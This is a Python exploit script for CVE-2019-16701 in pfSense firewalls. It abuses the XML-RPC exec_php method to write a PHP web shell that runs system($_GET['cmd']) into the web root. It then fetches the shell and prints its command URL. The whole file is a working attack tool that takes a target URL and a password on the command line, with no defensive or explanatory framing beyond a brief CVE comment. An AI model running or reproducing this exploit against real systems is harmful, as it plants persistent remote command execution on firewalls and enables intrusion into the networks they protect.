import requests
from log_colors import *
import random
import json
import string
import argparse

requests.packages.urllib3.disable_warnings()

# CVE-2019-16701
# Pfsense 2.3.4 --> 2.4.4-p3
# Remote Code Injection
class CVE2019_16701:
    headers = {"User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:61.0) Gecko/20100101 Firefox/61.0"}

    def __init__(self, url, password):
        self.url = url
        self.password = password
        self.session = requests.Session()
    
    # login to pfsense
    def login(self):
        data = "<?xml version='1.0' encoding='iso-8859-1'?>"
        data += "<methodCall>"
        data += "<methodName>pfsense.host_firmware_version</methodName>"
        data += "<params>"
        data += "<param><value><string>" + self.password + "</string></value></param>"
        data += "</params>"
        data += "</methodCall>"
        r = self.session.get(
                self.url + "/xmlrpc.php",
                data = data, headers = self.headers,
            )
        if r.ok:
            if "authentication failed" in r.text.lower():
                print (LogColors.RED + "login failed :(..." + LogColors.ENDC)
                return False
            else:
                print (LogColors.GREEN + "successfully log in..." + LogColors.ENDC)
                return True
        print (LogColors.RED + "login failed. error :(" + LogColors.ENDC)
        return False
    
    # check if vuln. got shell :)
    def is_vuln(self):
        vuln = False
        kuku = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(32)])
        data = "<?xml version='1.0' encoding='iso-8859-1'?>"
        data += "<methodCall>"
        data += "<methodName>pfsense.exec_php</methodName>"
        data += "<params>"
        data += "<param><value><string>" + self.password + "</string></value></param>"
        data += "<param><value><string>exec('echo \\'<pre> <?php $res = system($_GET[\"cmd\"]); echo $res ?> </pre>\\' > /usr/local/www/" + kuku + ".php');</string></value></param>"
        data += "</params>"
        data += "</methodCall>"
        r = self.session.get(
                self.url + "/xmlrpc.php",
                timeout = 10, data = data,
                )
        r = self.session.get(self.url + "/" + str(kuku) + ".php")
        if r.ok:
            print (LogColors.GREEN + "hacked :)".format(self.url) + LogColors.ENDC)
            print (LogColors.BLUE + "shell: " + self.url + "/" + str(kuku) + ".php" + "?cmd=id" + LogColors.ENDC)
            vuln = True
        else:
            print (LogColors.YELLOW + "{} is not vulnerable :(".format(self.url) + LogColors.ENDC)
        return vuln

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target pfsense url")
    parser.add_argument('-p', '--password', required = True, help = "password")
    args = vars(parser.parse_args())
    url, password = args['target'], args['password']
    cve = CVE2019_16701(url, password)
    cve.is_vuln()

